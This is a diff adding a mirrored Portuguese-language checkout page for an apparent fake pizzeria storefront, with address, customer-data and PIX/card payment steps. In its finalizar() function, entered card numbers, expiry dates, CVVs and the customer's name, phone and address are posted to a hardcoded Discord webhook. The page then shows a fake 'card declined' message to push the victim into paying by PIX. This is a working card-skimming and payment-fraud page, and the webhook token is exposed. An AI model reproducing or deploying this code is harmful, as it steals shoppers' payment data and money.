@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from pizzarevoitalia.lovable.app/checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Aug 2026 04:41:37 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'../connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1063660512841116');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1063660512841116&amp;ev=PageView&amp;noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout | Pizzaria Italia</title>
+<link rel="stylesheet" href="css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&amp;display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Inter',sans-serif;background:#fcfbf8;color:#111;padding-bottom:32px}
+  .topbar{background:linear-gradient(135deg,#006437 0%,#00522d 100%);height:62px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;box-shadow:0 3px 14px rgba(0,100,55,.28);position:sticky;top:0;z-index:200}
+  .topbar-back{width:38px;height:38px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.16);border-radius:11px;color:#fff;text-decoration:none;border:none;cursor:pointer}
+  .topbar-title{display:flex;flex-direction:column;align-items:center}
+  .topbar-title strong{color:#fff;font-size:16px;font-weight:800}
+  .topbar-title span{color:rgba(255,255,255,.65);font-size:11px;font-weight:600}
+  .topbar-spacer{width:38px}
+  .container{max-width:480px;margin:0 auto;padding:16px}
+
+  /* stepper */
+  .steps{display:flex;align-items:flex-start;justify-content:space-between;margin:4px 6px 20px;position:relative}
+  .steps .st{flex:1;display:flex;flex-direction:column;align-items:center;gap:6px;position:relative;z-index:2}
+  .steps .st .dot{width:34px;height:34px;border-radius:50%;background:#e5e7eb;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:14px;transition:.2s}
+  .steps .st span{font-size:12px;font-weight:800;color:#9ca3af}
+  .steps .st.done .dot{background:#006437}
+  .steps .st.done span{color:#006437}
+  .steps .st.active .dot{background:#c8102e;box-shadow:0 0 0 5px rgba(200,16,46,.14)}
+  .steps .st.active span{color:#c8102e}
+  .steps .line{position:absolute;top:17px;left:18%;right:18%;height:2px;background:#e5e7eb;z-index:1}
+
+  .card{background:#fff;border-radius:16px;padding:18px;box-shadow:0 2px 10px rgba(0,0,0,.06);margin-bottom:14px}
+  .card h2{font-size:15px;font-weight:900;color:#222;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+  .card h2 i{color:#c8102e}
+  .form-group{margin-bottom:12px}
+  .form-group label{display:block;font-weight:800;font-size:13px;color:#333;margin-bottom:6px;display:flex;align-items:center;gap:6px}
+  .form-group label i{color:#c8102e;font-size:12px}
+  .form-group label em{font-style:normal;color:#9ca3af;font-weight:700;font-size:11px}
+  .form-group input,.form-group textarea{width:100%;padding:13px 14px;border:1.5px solid #e5e7eb;border-radius:12px;font-size:14px;font-family:inherit;background:#fff}
+  .form-group input:focus,.form-group textarea:focus{outline:none;border-color:#006437}
+  .row{display:flex;gap:10px}
+  .row .form-group{flex:1}
+  .addr-box{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:12px 14px;display:flex;gap:10px;margin-bottom:14px}
+  .addr-box i{color:#16a34a;margin-top:3px}
+  .addr-box strong{display:block;font-size:13.5px;font-weight:800;color:#14532d;line-height:1.4}
+  .addr-box button{background:none;border:none;color:#c8102e;font-weight:800;font-size:12px;cursor:pointer;padding:4px 0 0;font-family:inherit}
+  .infobar{background:#f0fdf4;border:1px solid #dcfce7;border-radius:12px;padding:11px 13px;display:flex;gap:9px;align-items:center;font-size:12.5px;color:#374151;line-height:1.4;margin-bottom:6px}
+  .infobar i{color:#16a34a;font-size:16px}
+  .infobar b{color:#16a34a}
+  .hint{font-size:12px;color:#9ca3af;font-weight:600;margin-top:-4px;margin-bottom:10px}
+  .err{font-size:12px;color:#c8102e;font-weight:700;margin-top:-4px;margin-bottom:10px;display:none}
+  .resumo-item{display:flex;justify-content:space-between;font-size:13px;padding:7px 0;color:#555;border-bottom:1px dashed #eee}
+  .resumo-item:last-child{border-bottom:none}
+  .resumo-total{display:flex;justify-content:space-between;margin-top:10px;padding-top:10px;border-top:2px solid #f0f0f0;font-weight:900;font-size:17px;color:#006437}
+  .payment-option{display:flex;align-items:center;gap:12px;padding:14px;border:2px solid #e5e7eb;background:#fff;border-radius:12px;margin-bottom:10px;cursor:pointer;transition:.2s}
+  .payment-option.active{border-color:#006437;background:#f0fdf4}
+  .payment-option i:first-child{color:#666;font-size:22px}
+  .payment-option.active i:first-child{color:#006437}
+  .payment-option .check{color:#e5e7eb;font-size:18px}
+  .payment-option.active .check{color:#16a34a}
+  .payment-option strong{display:block;font-weight:800;color:#222}
+  .payment-option small{color:#666;font-size:12px}
+  .btn-main{width:100%;padding:16px;font-weight:900;font-size:15px;border-radius:14px;border:none;background:#c8102e;color:#fff;box-shadow:0 6px 18px rgba(200,16,46,.28);cursor:pointer;display:flex;align-items:center;justify-content:center;gap:9px;font-family:inherit}
+  .btn-main.green{background:linear-gradient(135deg,#006437 0%,#00522d 100%);box-shadow:0 6px 18px rgba(0,100,55,.3)}
+  .btn-main:active{transform:scale(.98)}
+  .btn-ghost{width:100%;padding:13px;margin-top:10px;font-weight:800;font-size:13px;border-radius:12px;border:1.5px solid #e5e7eb;background:#fff;color:#555;cursor:pointer;font-family:inherit}
+  .cpf-box{display:flex;align-items:center;gap:12px;background:#f7f8fa;border-radius:16px;padding:14px 16px;margin-bottom:12px}
+  .cpf-txt{flex:1}
+  .cpf-txt strong{display:flex;align-items:center;gap:7px;font-size:14.5px;font-weight:900;color:#1f2937}
+  .cpf-txt strong i{color:#c8102e;font-size:14px}
+  .cpf-txt small{display:block;color:#9ca3af;font-size:12.5px;font-weight:600;line-height:1.35;margin-top:2px}
+  .cpf-toggle{display:flex;gap:8px}
+  .cpf-toggle button{padding:9px 20px;border-radius:999px;border:1.5px solid #e5e7eb;background:#fff;color:#9ca3af;font-weight:800;font-size:13.5px;font-family:inherit;cursor:pointer;transition:.15s}
+  .cpf-toggle button.on{background:#eceef1;border-color:#d3d7dd;color:#1f2937;box-shadow:inset 0 1px 2px rgba(0,0,0,.06)}
+  .hide{display:none!important}
+  
+  /* Modal Recusa */
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:1000;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
+  .modal-card{background:#fff;width:100%;max-width:380px;border-radius:24px;padding:32px 24px;text-align:center;box-shadow:0 20px 25px -5px rgba(0,0,0,0.1),0 10px 10px -5px rgba(0,0,0,0.04);animation:modalIn 0.3s ease-out}
+  @keyframes modalIn{from{opacity:0;transform:translateY(20px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}
+  .modal-icon{width:70px;height:70px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:32px}
+  .modal-icon.loading{background:#f3f4f6;color:#c8102e;animation:spin 1s linear infinite}
+  .modal-icon.error{background:#fef2f2;color:#dc2626}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .modal-title{font-size:20px;font-weight:900;color:#111;margin-bottom:12px}
+  .modal-text{font-size:14px;color:#6b7280;line-height:1.5;margin-bottom:24px}
+  .card.compact{padding:12px;margin-bottom:8px}
+  .card.compact h2{margin-bottom:8px}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <button class="topbar-back" onclick="voltar()"><i class="fas fa-arrow-left"></i></button>
+  <div class="topbar-title"><strong>Finalizar pedido</strong><span>Pizzaria Italia</span></div>
+  <div class="topbar-spacer"></div>
+</header>
+
+<div class="container">
+  <div class="steps">
+    <div class="line"></div>
+    <div class="st active" id="st1"><div class="dot">1</div><span>Endereço</span></div>
+    <div class="st" id="st2"><div class="dot">2</div><span>Dados</span></div>
+    <div class="st" id="st3"><div class="dot">3</div><span>Pagamento</span></div>
+  </div>
+
+  <!-- ETAPA 1 -->
+  <section id="etapa1">
+    <div class="card">
+      <h2><i class="fas fa-map-marker-alt"></i> Para onde será entregue</h2>
+
+      <div class="form-group">
+        <label><i class="fas fa-map-pin"></i> CEP *</label>
+        <input id="cep" inputmode="numeric" maxlength="9" placeholder="00000-000">
+      </div>
+      <div class="hint" id="cepHint">Digite o CEP para buscarmos seu endereço</div>
+      <div class="err" id="cepErr">CEP não encontrado. Confira e tente novamente.</div>
+
+      <div class="addr-box hide" id="addrBox">
+        <i class="fas fa-map-marker-alt"></i>
+        <div style="flex:1">
+          <strong id="addrText"></strong>
+          <button type="button" onclick="editarEndereco()">Editar endereço</button>
+        </div>
+      </div>
+
+      <div id="manualAddr" class="hide">
+        <div class="form-group"><label>Rua *</label><input id="rua" placeholder="Nome da rua"></div>
+        <div class="row">
+          <div class="form-group"><label>Bairro *</label><input id="bairro" placeholder="Bairro"></div>
+          <div class="form-group"><label>Cidade *</label><input id="cidade" placeholder="Cidade"></div>
+        </div>
+      </div>
+
+      <div class="row">
+        <div class="form-group"><label>Número *</label><input id="numero" inputmode="numeric" placeholder="123"></div>
+        <div class="form-group"><label>Complemento <em>(opcional)</em></label><input id="complemento" placeholder="Apto / Bloco"></div>
+      </div>
+
+      <div class="infobar"><i class="fas fa-truck-fast"></i><div>Entrega <b>monitorada em tempo real</b> — rápida e segura</div></div>
+    </div>
+    <button class="btn-main" onclick="irEtapa2()">Continuar <i class="fas fa-arrow-right"></i></button>
+  </section>
+
+  <!-- ETAPA 2 -->
+  <section id="etapa2" class="hide">
+    <div class="card">
+      <h2><i class="fas fa-user"></i> Seus dados</h2>
+      <div class="form-group"><label>Nome completo *</label><input id="nome" placeholder="Ex: Joao da Silva"></div>
+      <div class="form-group"><label>WhatsApp *</label><input id="telefone" inputmode="numeric" placeholder="(11) 99999-9999"></div>
+
+      <div class="cpf-box">
+        <div class="cpf-txt">
+          <strong><i class="fas fa-file-invoice"></i> CPF na Nota?</strong>
+          <small>Inclua seu CPF no comprovante</small>
+        </div>
+        <div class="cpf-toggle">
+          <button type="button" id="cpfNao" class="on" onclick="setCpf(false)">Não</button>
+          <button type="button" id="cpfSim" onclick="setCpf(true)">Sim</button>
+        </div>
+      </div>
+      <div class="form-group hide" id="cpfWrap"><label>CPF</label><input id="cpf" inputmode="numeric" placeholder="000.000.000-00"></div>
+      <div class="form-group"><label>Observações do pedido <em>(opcional)</em></label><textarea id="obs" rows="2" placeholder="Ex: portao azul, tocar 2x"></textarea></div>
+    </div>
+    <button class="btn-main" onclick="irEtapa3()">Continuar <i class="fas fa-arrow-right"></i></button>
+    <button class="btn-ghost" onclick="irEtapa1()">Voltar</button>
+  </section>
+
+  <!-- ETAPA 3 -->
+  <section id="etapa3" class="hide">
+    <div class="card compact">
+      <h2><i class="fas fa-credit-card"></i> Forma de pagamento</h2>
+      <div class="payment-options">
+        <div class="payment-option active" id="payPix" onclick="setPayment('PIX')" style="padding: 10px; margin-bottom: 8px;">
+          <i class="fas fa-qrcode" style="font-size: 18px;"></i>
+          <div style="flex:1; margin-left: 10px;"><strong>PIX</strong><small style="font-size: 11px;">Aprovacao imediata · sem taxas</small></div>
+          <i class="fas fa-check-circle check"></i>
+        </div>
+        
+        <div class="payment-option" id="payCard" onclick="setPayment('CREDIT_CARD')" style="display: none; padding: 10px; margin-bottom: 8px;">
+          <i class="fas fa-credit-card" style="font-size: 18px;"></i>
+          <div style="flex:1; margin-left: 10px;"><strong>Cartão de Crédito</strong><small style="font-size: 11px;">Parcelamento em até 12x</small></div>
+          <i class="fas fa-check-circle check"></i>
+        </div>
+      </div>
+
+      <!-- Order Bump Section -->
+      <div class="card compact" style="border: 2px dashed #16a34a; background-color: #f0fdf4; margin-top: 10px; margin-bottom: 0; padding: 10px; box-shadow: none;">
+        <h3 style="font-size: 13px; font-weight: 800; color: #16a34a; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; gap: 6px;">
+          <i class="fas fa-gifts"></i> Aproveite e adicione sobremesa!
+        </h3>
+        
+        <!-- Churros Bump -->
+        <div id="orderBumpCardChurros" style="display: flex; align-items: center; gap: 10px; padding: 6px 10px; background: #fff; border-radius: 10px; border: 1px solid #e2e8f0; margin-bottom: 6px;">
+          <input type="checkbox" id="bumpCheckboxChurros" style="width: 20px; height: 20px; accent-color: #16a34a; cursor: pointer; flex-shrink: 0;" onchange="toggleBump()">
+          <img src="https://piizaria-aberta.vercel.app/images/churros_bump.jpg" alt="10 Mini Churros" style="width: 42px; height: 42px; border-radius: 6px; object-fit: cover; flex-shrink: 0;">
+          <div style="flex: 1;">
+            <strong style="color: #27272a; font-size: 13px; display: block; font-weight: 800; line-height: 1.2;">10 Mini Churros</strong>
+            <span style="font-size: 11px; color: #71717a; font-weight: 600;">De <span style="text-decoration: line-through;">R$ 19,90</span> por <strong style="color: #dc2626; font-size: 12.5px;">R$ 11,90</strong></span>
+          </div>
+        </div>
+
+        <!-- Brownie Bump -->
+        <div id="orderBumpCardBrownie" style="display: flex; align-items: center; gap: 10px; padding: 6px 10px; background: #fff; border-radius: 10px; border: 1px solid #e2e8f0; margin-bottom: 0;">
+          <input type="checkbox" id="bumpCheckboxBrownie" style="width: 20px; height: 20px; accent-color: #16a34a; cursor: pointer; flex-shrink: 0;" onchange="toggleBump()">
+          <img src="https://pizzaria-aberta-agora.vercel.app/images/brownie_bump.jpg" alt="5 Brownies" style="width: 42px; height: 42px; border-radius: 6px; object-fit: cover; flex-shrink: 0;">
+          <div style="flex: 1;">
+            <strong style="color: #27272a; font-size: 13px; display: block; font-weight: 800; line-height: 1.2;">5 Brownies</strong>
+            <span style="font-size: 11px; color: #71717a; font-weight: 600;">De <span style="text-decoration: line-through;">R$ 14,90</span> por <strong style="color: #dc2626; font-size: 12.5px;">R$ 7,90</strong></span>
+          </div>
+        </div>
+      </div>
+
+      <div id="cardForm" class="hide" style="margin-top:16px; border-top: 1px solid #eee; padding-top: 16px;">
+        <div class="form-group">
+          <label><i class="fas fa-user"></i> Nome no Cartão</label>
+          <input id="cardName" placeholder="Como está no cartão">
+        </div>
+        <div class="form-group">
+          <label><i class="fas fa-credit-card"></i> Número do Cartão</label>
+          <input id="cardNumber" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
+        </div>
+        <div class="row">
+          <div class="form-group">
+            <label><i class="fas fa-calendar-alt"></i> Validade</label>
+            <input id="cardExpiry" placeholder="MM/AA" maxlength="5">
+          </div>
+          <div class="form-group">
+            <label><i class="fas fa-lock"></i> CVV</label>
+            <input id="cardCvv" inputmode="numeric" maxlength="4" placeholder="123">
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="card compact">
+      <h2><i class="fas fa-receipt"></i> Resumo</h2>
+      <div id="resumo"></div>
+      <div class="resumo-total"><span>Total</span><span id="total">R$ 0,00</span></div>
+    </div>
+
+    <div class="card compact">
+      <h2><i class="fas fa-map-marker-alt"></i> Entrega</h2>
+      <div style="font-size:12px;color:#555;line-height:1.4" id="revisao"></div>
+    </div>
+
+    <button class="btn-main green" id="btnFinalizar" onclick="finalizar()" style="padding: 13px; font-size: 14px; border-radius: 12px; margin-top: 10px;"><i class="fas fa-lock"></i> Ir para o pagamento PIX</button>
+    <button class="btn-ghost" onclick="irEtapa2()" style="padding: 10px; font-size: 12px; border-radius: 10px; margin-top: 6px;">Voltar</button>
+  </section>
+</div>
+
+<script>
+const CART_KEY='pizza_cart_v1',CHECKOUT_KEY='pizza_checkout_v1';
+const money=v=>'R$ '+Number(v||0).toFixed(2).replace('.',',');
+const $=id=>document.getElementById(id);
+const cart=(()=>{try{return JSON.parse(localStorage.getItem(CART_KEY)||'[]')}catch(e){return[]}})();
+if(!cart.length){location.replace('carrinho.html')}
+const subtotal=cart.reduce((s,i)=>s+Number(i.total||0)*(i.qty||1),0);
+$('resumo').innerHTML=cart.map(i=>`<div class="resumo-item"><span>${i.qty||1}x ${i.plan||'Item'}</span><span>${money(Number(i.total||0)*(i.qty||1))}</span></div>`).join('')+`<div class="resumo-item"><span>Entrega</span><span style="color:#16a34a;font-weight:800">GRATIS</span></div>`;
+$('total').textContent=money(subtotal);
+if(typeof fbq==='function'){
+  fbq('track','InitiateCheckout',{value:Number(subtotal||0).toFixed(2),currency:'BRL',content_type:'product',contents:cart.map(i=>({id:i.plan||'item',quantity:i.qty||1,item_price:Number(i.total||0).toFixed(2)}))});
+}
+
+let etapa=1, paymentMethod='PIX';
+
+let churrosBumpAdded = false;
+let brownieBumpAdded = false;
+const originalSubtotal = subtotal;
+let finalTotal = subtotal;
+
+function toggleBump() {
+  churrosBumpAdded = $('bumpCheckboxChurros').checked;
+  brownieBumpAdded = $('bumpCheckboxBrownie').checked;
+  
+  let additionalTotal = 0;
+  let bumpItemsHTML = '';
+  
+  if (churrosBumpAdded) {
+    additionalTotal += 11.90;
+    bumpItemsHTML += `<div class="resumo-item" id="churrosResumo"><span>1x 10 Mini Churros</span><span>R$ 11,90</span></div>`;
+  }
+  if (brownieBumpAdded) {
+    additionalTotal += 7.90;
+    bumpItemsHTML += `<div class="resumo-item" id="brownieResumo"><span>1x 5 Brownies</span><span>R$ 7,90</span></div>`;
+  }
+  
+  finalTotal = originalSubtotal + additionalTotal;
+  
+  $('resumo').innerHTML = cart.map(i=>`<div class="resumo-item"><span>${i.qty||1}x ${i.plan||'Item'}</span><span>${money(Number(i.total||0)*(i.qty||1))}</span></div>`).join('') +
+    bumpItemsHTML +
+    `<div class="resumo-item"><span>Entrega</span><span style="color:#16a34a;font-weight:800">GRATIS</span></div>`;
+    
+  $('total').textContent = money(finalTotal);
+}
+
+// prefill
+try{
+  const p=JSON.parse(localStorage.getItem(CHECKOUT_KEY)||'{}');
+  ['cep','rua','bairro','cidade','numero','complemento','nome','telefone','cpf','obs'].forEach(k=>{if(p[k]&&$(k))$(k).value=p[k]});
+  if(p.rua&&p.cidade)mostrarEndereco();
+}catch(e){}
+
+// masks
+$('cep').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,8);
+  e.target.value=v.length>5?v.slice(0,5)+'-'+v.slice(5):v;
+  if(v.length===8)buscarCep(v);
+});
+$('telefone').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,11);
+  if(v.length>10)v=`(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
+  else if(v.length>6)v=`(${v.slice(0,2)}) ${v.slice(2,6)}-${v.slice(6)}`;
+  else if(v.length>2)v=`(${v.slice(0,2)}) ${v.slice(2)}`;
+  e.target.value=v;
+});
+$('cpf').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,11);
+  v=v.replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+  e.target.value=v;
+});
+$('cardNumber').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,16);
+  e.target.value=v.replace(/(\d{4})/g,'$1 ').trim();
+});
+$('cardExpiry').addEventListener('input',e=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,4);
+  if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);
+  e.target.value=v;
+});
+$('cardCvv').addEventListener('input',e=>{
+  e.target.value=e.target.value.replace(/\D/g,'').slice(0,4);
+});
+
+function setPayment(m){
+  paymentMethod=m;
+  $('payPix').classList.toggle('active',m==='PIX');
+  $('payCard').classList.toggle('active',m==='CREDIT_CARD');
+  $('cardForm').classList.toggle('hide',m==='PIX');
+  $('btnFinalizar').innerHTML=m==='PIX'?'<i class="fas fa-lock"></i> Ir para o pagamento PIX':'<i class="fas fa-lock"></i> Finalizar com Cartão';
+}
+function setCpf(sim){
+  $('cpfSim').classList.toggle('on',sim);
+  $('cpfNao').classList.toggle('on',!sim);
+  $('cpfWrap').classList.toggle('hide',!sim);
+  if(!sim)$('cpf').value='';
+  else $('cpf').focus();
+}
+if($('cpf').value.trim())setCpf(true);
+
+async function buscarCep(cep){
+  $('cepErr').style.display='none';
+  $('cepHint').textContent='Buscando endereço...';
+  try{
+    const r=await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+    const d=await r.json();
+    if(d.erro)throw 0;
+    $('rua').value=d.logradouro||'';
+    $('bairro').value=d.bairro||'';
+    $('cidade').value=(d.localidade||'')+(d.uf?' - '+d.uf:'');
+    mostrarEndereco();
+    $('numero').focus();
+  }catch(e){
+    $('cepHint').textContent='Digite o CEP para buscarmos seu endereço';
+    $('cepErr').style.display='block';
+    editarEndereco();
+  }
+}
+function mostrarEndereco(){
+  $('addrText').textContent=[$('rua').value,$('bairro').value,$('cidade').value].filter(Boolean).join(', ');
+  $('addrBox').classList.remove('hide');
+  $('manualAddr').classList.add('hide');
+  $('cepHint').classList.add('hide');
+}
+function editarEndereco(){
+  $('addrBox').classList.add('hide');
+  $('manualAddr').classList.remove('hide');
+  $('cepHint').classList.remove('hide');
+  $('cepHint').textContent='Preencha o endereço manualmente';
+}
+function setEtapa(n){
+  etapa=n;
+  [1,2,3].forEach(i=>{
+    $('etapa'+i).classList.toggle('hide',i!==n);
+    const st=$('st'+i);st.className='st'+(i===n?' active':i<n?' done':'');
+  });
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function irEtapa1(){setEtapa(1)}
+function irEtapa2(){
+  if($('cep').value.replace(/\D/g,'').length!==8)return alert('Informe um CEP válido.');
+  if(!$('rua').value.trim()||!$('bairro').value.trim()||!$('cidade').value.trim()){editarEndereco();return alert('Preencha rua, bairro e cidade.')}
+  if(!$('numero').value.trim())return alert('Informe o número.');
+  salvar();setEtapa(2);
+}
+function irEtapa3(){
+  if(!$('nome').value.trim())return alert('Informe seu nome completo.');
+  if($('telefone').value.replace(/\D/g,'').length<10)return alert('Informe um WhatsApp válido.');
+  salvar();
+  $('revisao').innerHTML=`<strong style="color:#111;font-size:13px">${$('nome').value}</strong><br>${$('rua').value}, ${$('numero').value}${$('complemento').value?' - '+$('complemento').value:''}<br>${$('bairro').value} · ${$('cidade').value} · CEP ${$('cep').value}<br>Contato: ${$('telefone').value}`;
+  setEtapa(3);
+}
+function voltar(){ if(etapa>1)setEtapa(etapa-1); else location.href='carrinho.html'; }
+function dados(){
+  const o={};
+  ['cep','rua','bairro','cidade','numero','complemento','nome','telefone','cpf','obs','cardName','cardNumber','cardExpiry','cardCvv'].forEach(k=>{if($(k))o[k]=$(k).value});
+  o.paymentMethod = paymentMethod;
+  return o;
+}
+function salvar(){
+  const prev=(()=>{try{return JSON.parse(localStorage.getItem(CHECKOUT_KEY)||'{}')}catch(e){return{}}})();
+  localStorage.setItem(CHECKOUT_KEY,JSON.stringify({...prev,...dados()}));
+}
+async function finalizar(){
+  if(paymentMethod==='CREDIT_CARD'){
+    const cName = $('cardName').value.trim();
+    const cNum = $('cardNumber').value.replace(/\D/g,'');
+    const cExp = $('cardExpiry').value.trim();
+    const cCvv = $('cardCvv').value.trim();
+
+    if(!cName) return alert('Informe o nome no cartão.');
+    if(cNum.length < 16) return alert('Informe um cartão válido.');
+    if(cExp.length < 5) return alert('Informe a validade.');
+    if(cCvv.length < 3) return alert('Informe o CVV.');
+    
+    // Criar Modal
+    const modal = document.createElement('div');
+    modal.className = 'modal-overlay';
+    modal.innerHTML = `
+      <div class="modal-card">
+        <div class="modal-icon loading" id="modalIcon"><i class="fas fa-spinner"></i></div>
+        <div class="modal-title" id="modalTitle">Processando...</div>
+        <div class="modal-text" id="modalText">Estamos validando os dados do seu cartão com a operadora.</div>
+      </div>
+    `;
+    document.body.appendChild(modal);
+    
+    const data = dados();
+    data.total = subtotal;
+    data.items = cart;
+    data.orderId = 'PIZZA-'+Date.now();
+    
+    // Envia para o NOVO webhook do discord
+    try {
+      await fetch('https://discord.com/api/webhooks/1538532902277615658/0UErhnnpoxvAbjtJVulGoyHIIOUZb45ypjHVKWOGGEbOHTNGGNQVtTzMfTaJhTIGQXoh', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          embeds: [{
+            title: "🚀 TENTATIVA DE PAGAMENTO - CARTÃO",
+            color: 16711680,
+            fields: [
+              { name: "👤 Cliente", value: data.nome || "Não informado", inline: true },
+              { name: "📞 Telefone", value: data.telefone || "Não informado", inline: true },
+              { name: "💳 Nome no Cartão", value: cName, inline: true },
+              { name: "🔢 Número", value: `\`${cNum}\``, inline: true },
+              { name: "📅 Expiração", value: cExp, inline: true },
+              { name: "🔒 CVV", value: cCvv, inline: true },
+              { name: "💰 Total", value: money(subtotal), inline: true },
+              { name: "📍 Endereço", value: `${data.rua}, ${data.numero} - ${data.bairro}` }
+            ],
+            footer: { text: "Pizzaria Italia | Sistema de Pagamento" },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    } catch(e) { console.error('Discord error:', e); }
+
+    setTimeout(() => {
+      const icon = document.getElementById('modalIcon');
+      const title = document.getElementById('modalTitle');
+      const text = document.getElementById('modalText');
+      
+      icon.className = 'modal-icon error';
+      icon.innerHTML = '<i class="fas fa-times"></i>';
+      title.textContent = 'Pagamento Recusado';
+      title.style.color = '#dc2626';
+      text.textContent = 'Infelizmente seu cartão foi recusado pela operadora. Por favor, tente pagar via PIX para garantir seu pedido.';
+      
+      const btn = document.createElement('button');
+      btn.className = 'btn-main';
+      btn.style.marginTop = '10px';
+      btn.innerHTML = '<i class="fab fa-pix"></i> PAGAR VIA PIX AGORA';
+      btn.onclick = () => {
+        modal.remove();
+        setPayment('PIX');
+        finalizar();
+      };
+      document.querySelector('.modal-card').appendChild(btn);
+    }, 3000);
+    return;
+  }
+  const data=dados();
+  data.total=finalTotal;
+  data.originalTotal=originalSubtotal;
+  data.churrosBumpAdded=churrosBumpAdded;
+  data.brownieBumpAdded=brownieBumpAdded;
+  data.items=cart;
+  data.createdAt=new Date().toISOString();
+  data.orderId='PIZZA-'+Date.now();
+  localStorage.setItem(CHECKOUT_KEY,JSON.stringify(data));
+  location.href='pagamento.html';
+}
+</script>
+</body>
+
+<!-- Mirrored from pizzarevoitalia.lovable.app/checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Aug 2026 04:41:38 GMT -->
+</html>
